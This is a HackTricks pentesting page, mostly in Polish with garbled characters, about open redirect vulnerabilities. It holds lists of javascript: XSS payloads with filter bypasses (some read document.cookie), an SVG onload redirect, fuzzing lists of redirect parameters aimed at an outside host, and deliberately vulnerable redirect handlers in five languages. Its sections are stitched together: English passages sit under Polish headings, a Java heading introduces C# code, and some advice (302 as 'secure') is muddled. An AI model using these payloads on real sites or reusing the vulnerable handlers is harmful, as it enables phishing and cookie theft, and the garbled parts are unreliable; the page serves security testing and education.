<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>


# Przekierowanie otwarte

## Przekierowanie do localhosta lub dowolnych domen

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

## Otwarte przekierowanie do XSS
```bash
#Basic payload, javascript code is executed after "javascript:"
javascript:alert(1)

#Bypass "javascript" word filter with CRLF
java%0d%0ascript%0d%0a:alert(0)

#Javascript with "://" (Notice that in JS "//" is a line coment, so new line is created before the payload). URL double encoding is needed
#This bypasses FILTER_VALIDATE_URL os PHP
javascript://%250Aalert(1)

#Variation of "javascript://" bypass when a query is also needed (using comments or ternary operator)
javascript://%250Aalert(1)//?1
javascript://%250A1?alert(1):0

#Others
%09Jav%09ascript:alert(document.domain)
javascript://%250Alert(document.location=document.cookie)
/%09/javascript:alert(1);
/%09/javascript:alert(1)
//%5cjavascript:alert(1);
//%5cjavascript:alert(1)
/%5cjavascript:alert(1);
/%5cjavascript:alert(1)
javascript://%0aalert(1)
<>javascript:alert(1);
//javascript:alert(1);
//javascript:alert(1)
/javascript:alert(1);
/javascript:alert(1)
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
javascript:alert(1);
javascript:alert(1)
javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
javascript:confirm(1)
javascript://https://whitelisted.com/?z=%0Aalert(1)
javascript:prompt(1)
jaVAscript://whitelisted.com//%0d%0aalert(1);//
javascript://whitelisted.com?%a0alert%281%29
/x:1/:///%01javascript:alert(document.cookie)/
";alert(0);//
```
# Description

An open redirect vulnerability occurs when a web application allows users to redirect to external URLs without proper validation. This can be exploited by an attacker to redirect users to malicious websites or phishing pages.

## Exploitation

1. Identify the vulnerable parameter or input field that allows URL redirection.
2. Craft a malicious URL by appending the desired redirect URL as a parameter value.
3. Upload an SVG file containing the crafted URL as the redirect target.
4. Submit the SVG file to the web application.
5. When the SVG file is accessed, the web application will redirect the user to the specified URL.

## Example

Suppose there is a vulnerable parameter called `redirect` in the URL `https://example.com/login?redirect=`.
An attacker can craft a malicious URL like `https://example.com/login?redirect=https://malicious.com` and upload it as an SVG file.
When the SVG file is accessed, the user will be redirected to `https://malicious.com`.

## Prevention

To prevent open redirect vulnerabilities, follow these best practices:

- Validate and sanitize all user-supplied input before using it in a redirect.
- Whitelist allowed redirect URLs instead of using a blacklist approach.
- Implement server-side checks to ensure that the redirect URL belongs to the same domain.
- Use a secure redirect method, such as `302 Found`, instead of `301 Moved Permanently`.
- Educate developers about the risks of open redirects and provide secure coding guidelines.

## References

- [OWASP - Unvalidated Redirects and Forwards](https://owasp.org/www-community/attacks/Unvalidated_Redirects_and_Forwards)
```markup
<code>
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg
onload="window.location='http://www.example.com'"
xmlns="http://www.w3.org/2000/svg">
</svg>
</code>
```
# WspÃ³lne parametry wstrzykiwania

When testing for open redirect vulnerabilities, it is important to understand the common injection parameters that can be exploited. These parameters are often found in the URL or in the request body. Here are some examples:

- **url**: This parameter is used to specify the target URL. Attackers can manipulate this parameter to redirect users to a malicious website.
- **redirect**: This parameter is used to specify the redirect URL. Attackers can modify this parameter to redirect users to a different website.
- **next**: This parameter is commonly used in login/logout functionality. Attackers can tamper with this parameter to redirect users to a malicious page after logging in or logging out.
- **return**: This parameter is often used in authentication flows. Attackers can modify this parameter to redirect users to a malicious page after successful authentication.
- **callback**: This parameter is commonly used in JSONP (JSON with Padding) requests. Attackers can manipulate this parameter to redirect users to a malicious website.

By understanding these common injection parameters, you can effectively test for open redirect vulnerabilities and protect your web application from potential attacks.
```
/{payload}
?next={payload}
?url={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={payload}
?return_path={payload}
success=https://c1h2e1.github.io
data=https://c1h2e1.github.io
qurl=https://c1h2e1.github.io
login=https://c1h2e1.github.io
logout=https://c1h2e1.github.io
ext=https://c1h2e1.github.io
clickurl=https://c1h2e1.github.io
goto=https://c1h2e1.github.io
rit_url=https://c1h2e1.github.io
forward_url=https://c1h2e1.github.io
@https://c1h2e1.github.io
forward=https://c1h2e1.github.io
pic=https://c1h2e1.github.io
callback_url=https://c1h2e1.github.io
jump=https://c1h2e1.github.io
jump_url=https://c1h2e1.github.io
click?u=https://c1h2e1.github.io
originUrl=https://c1h2e1.github.io
origin=https://c1h2e1.github.io
Url=https://c1h2e1.github.io
desturl=https://c1h2e1.github.io
u=https://c1h2e1.github.io
page=https://c1h2e1.github.io
u1=https://c1h2e1.github.io
action=https://c1h2e1.github.io
action_url=https://c1h2e1.github.io
Redirect=https://c1h2e1.github.io
sp_url=https://c1h2e1.github.io
service=https://c1h2e1.github.io
recurl=https://c1h2e1.github.io
j?url=https://c1h2e1.github.io
url=//https://c1h2e1.github.io
uri=https://c1h2e1.github.io
u=https://c1h2e1.github.io
allinurl:https://c1h2e1.github.io
q=https://c1h2e1.github.io
link=https://c1h2e1.github.io
src=https://c1h2e1.github.io
tc?src=https://c1h2e1.github.io
linkAddress=https://c1h2e1.github.io
location=https://c1h2e1.github.io
burl=https://c1h2e1.github.io
request=https://c1h2e1.github.io
backurl=https://c1h2e1.github.io
RedirectUrl=https://c1h2e1.github.io
Redirect=https://c1h2e1.github.io
ReturnUrl=https://c1h2e1.github.io
```
```csharp
using System;
using System.Web;

namespace OpenRedirect
{
    public partial class Redirect : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            string redirectUrl = Request.QueryString["url"];
            if (!string.IsNullOrEmpty(redirectUrl))
            {
                Response.Redirect(redirectUrl);
            }
        }
    }
}
```

### Java

```java
import java.io.IOException;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class RedirectServlet extends HttpServlet {
    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        String redirectUrl = request.getParameter("url");
        if (redirectUrl != null && !redirectUrl.isEmpty()) {
            response.sendRedirect(redirectUrl);
        }
    }
}
```

### PHP

```php
<?php
if (isset($_GET['url'])) {
    $redirectUrl = $_GET['url'];
    header("Location: $redirectUrl");
    exit();
}
?>
```

### Python

```python
from flask import Flask, redirect, request

app = Flask(__name__)

@app.route('/redirect')
def redirect_url():
    redirect_url = request.args.get('url')
    if redirect_url:
        return redirect(redirect_url)
    else:
        return 'No redirect URL provided.'

if __name__ == '__main__':
    app.run()
```

### Ruby

```ruby
require 'sinatra'

get '/redirect' do
    redirect_url = params[:url]
    if redirect_url
        redirect redirect_url
    else
        'No redirect URL provided.'
    end
end
```
```bash
response.redirect("~/mysafe-subdomain/login.aspx")
```
### Java

Java jest popularnym jÄ™zykiem programowania, ktÃ³ry jest szeroko stosowany w tworzeniu aplikacji webowych. JednakÅ¼e, jak kaÅ¼dy inny jÄ™zyk programowania, Java rÃ³wnieÅ¼ moÅ¼e byÄ‡ podatna na rÃ³Å¼ne luki bezpieczeÅ„stwa. W tym rozdziale omÃ³wimy jednÄ… z takich luk - przekierowanie otwarte.

#### Przekierowanie otwarte

Przekierowanie otwarte to luka bezpieczeÅ„stwa, ktÃ³ra wystÄ™puje, gdy aplikacja webowa przekierowuje uÅ¼ytkownika na zewnÄ™trzny adres URL, ktÃ³ry jest kontrolowany przez atakujÄ…cego. AtakujÄ…cy moÅ¼e wykorzystaÄ‡ tÄ™ lukÄ™, aby przekierowaÄ‡ uÅ¼ytkownika na zÅ‚oÅ›liwÄ… stronÄ™ lub wykonaÄ‡ atak typu phishing.

W Javie, przekierowanie otwarte moÅ¼e wystÄ…piÄ‡, gdy aplikacja uÅ¼ywa metody `sendRedirect()` z klasy `HttpServletResponse` do przekierowania uÅ¼ytkownika na inny adres URL. AtakujÄ…cy moÅ¼e manipulowaÄ‡ tym adresem URL, aby przekierowaÄ‡ uÅ¼ytkownika na zÅ‚oÅ›liwÄ… stronÄ™.

#### Wykrywanie przekierowania otwartego

Aby wykryÄ‡ przekierowanie otwarte w aplikacji Javy, moÅ¼na przeprowadziÄ‡ testy penetracyjne, podczas ktÃ³rych sprawdza siÄ™, czy aplikacja umoÅ¼liwia przekierowanie na dowolny adres URL. MoÅ¼na to zrobiÄ‡, dodajÄ…c parametr `url` do adresu URL aplikacji i sprawdzajÄ…c, czy przekierowanie jest wykonywane na ten adres.

#### Zapobieganie przekierowaniu otwartemu

Aby zapobiec przekierowaniu otwartemu w aplikacji Javy, naleÅ¼y zawsze sprawdzaÄ‡, czy przekierowanie jest wykonywane na zaufane adresy URL. MoÅ¼na to zrobiÄ‡, porÃ³wnujÄ…c adres URL przekierowania z listÄ… zaufanych adresÃ³w URL lub uÅ¼ywajÄ…c mechanizmu filtrÃ³w, ktÃ³ry sprawdza, czy adres URL przekierowania jest bezpieczny.

#### Podsumowanie

Przekierowanie otwarte jest jednÄ… z luk bezpieczeÅ„stwa, ktÃ³re mogÄ… wystÄ…piÄ‡ w aplikacjach Javy. Aby zapobiec tej luce, naleÅ¼y zawsze sprawdzaÄ‡, czy przekierowanie jest wykonywane na zaufane adresy URL i unikaÄ‡ przekierowywania na adresy kontrolowane przez uÅ¼ytkownika.
```bash
response.redirect("http://mysafedomain.com");
```
### PHP

PHP jest popularnym jÄ™zykiem programowania wykorzystywanym do tworzenia stron internetowych. Niestety, PHP moÅ¼e byÄ‡ podatny na ataki, takie jak przekierowanie otwarte. Przekierowanie otwarte to luka w zabezpieczeniach, ktÃ³ra umoÅ¼liwia atakujÄ…cemu przekierowanie uÅ¼ytkownika na dowolny inny adres URL. AtakujÄ…cy moÅ¼e wykorzystaÄ‡ tÄ™ lukÄ™, aby przekierowaÄ‡ uÅ¼ytkownika na zÅ‚oÅ›liwÄ… stronÄ™ lub wykonaÄ‡ inne niepoÅ¼Ä…dane dziaÅ‚ania.

Aby uniknÄ…Ä‡ przekierowania otwartego, naleÅ¼y zawsze sprawdzaÄ‡ i weryfikowaÄ‡ adresy URL przekierowaÅ„. NaleÅ¼y upewniÄ‡ siÄ™, Å¼e przekierowanie odbywa siÄ™ tylko na zaufane i zaakceptowane adresy URL. MoÅ¼na to osiÄ…gnÄ…Ä‡ poprzez sprawdzenie, czy adres URL zawiera oczekiwane parametry lub jest zgodny z listÄ… zaufanych adresÃ³w URL.

PrzykÅ‚ad kodu PHP, ktÃ³ry moÅ¼e byÄ‡ podatny na przekierowanie otwarte:

```php
<?php
    $url = $_GET['url'];
    header("Location: " . $url);
?>
```

W powyÅ¼szym przykÅ‚adzie kodu, atakujÄ…cy moÅ¼e przekazaÄ‡ dowolny adres URL jako parametr `url` w Å¼Ä…daniu GET. NastÄ™pnie, ten adres URL jest uÅ¼ywany w funkcji `header("Location: " . $url)` do przekierowania uÅ¼ytkownika. JeÅ›li nie ma Å¼adnej weryfikacji adresu URL, atakujÄ…cy moÅ¼e wykorzystaÄ‡ tÄ™ lukÄ™ do przekierowania uÅ¼ytkownika na zÅ‚oÅ›liwÄ… stronÄ™.

Aby zabezpieczyÄ‡ siÄ™ przed przekierowaniem otwartym, moÅ¼na dodaÄ‡ weryfikacjÄ™ adresu URL, na przykÅ‚ad:

```php
<?php
    $url = $_GET['url'];
    $allowedUrls = array("https://example.com", "https://trusted-site.com");
    
    if (in_array($url, $allowedUrls)) {
        header("Location: " . $url);
    } else {
        echo "NieprawidÅ‚owy adres URL";
    }
?>
```

W powyÅ¼szym przykÅ‚adzie kodu, tylko adresy URL znajdujÄ…ce siÄ™ na liÅ›cie `$allowedUrls` bÄ™dÄ… akceptowane do przekierowania. JeÅ›li adres URL przekazany jako parametr `url` nie znajduje siÄ™ na liÅ›cie zaufanych adresÃ³w URL, zostanie wyÅ›wietlony komunikat o nieprawidÅ‚owym adresie URL.
```php
<?php
/* browser redirections*/
header("Location: http://mysafedomain.com");
exit;
?>
```
# NarzÄ™dzia

* [https://github.com/0xNanda/Oralyzer](https://github.com/0xNanda/Oralyzer)

# Zasoby

* W [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect) znajdziesz listy fuzzingowe.
* [https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)
* [https://github.com/cujanovic/Open-Redirect-Payloads](https://github.com/cujanovic/Open-Redirect-Payloads)
* [https://infosecwriteups.com/open-redirects-bypassing-csrf-validations-simplified-4215dc4f180a](https://infosecwriteups.com/open-redirects-bypassing-csrf-validations-simplified-4215dc4f180a)


<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
